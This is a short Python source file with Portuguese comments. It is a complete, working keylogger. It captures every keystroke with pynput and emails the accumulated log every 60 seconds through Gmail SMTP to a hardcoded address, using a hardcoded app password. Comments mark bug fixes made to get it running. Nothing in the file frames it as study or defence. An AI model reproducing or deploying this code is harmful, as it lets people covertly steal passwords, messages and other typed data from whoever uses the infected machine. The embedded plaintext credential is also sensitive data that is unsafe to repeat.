from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

# CONFIGURAÇÕES DE E-MAIL
EMAIL_ORIGEM = "compartilhandoIestudando@gmail.com"
EMAIL_DESTINO = "compartilhandoIestudando@gmail.com"
SENHA_EMAIL = "lvvz cckr emzu rlco"

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados Capturados Pelo Keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO
        
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)  # Corrigido de .log para .login
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar", e)

        log = ""

    # Agendar o envio a cada 60 segundos (deve rodar sempre para manter o ciclo)
    Timer(60, enviar_email).start()  # Corrigido de Time para Timer

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:  # Adicionado os dois pontos (:) que faltavam
            log += "\n"
        elif key == keyboard.Key.backspace:
            log += "[<]"
        else:
            pass  # Ignorar control, shift, etc.

# Inicia o envio automático pela primeira vez e o keylogger
Timer(60, enviar_email).start()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
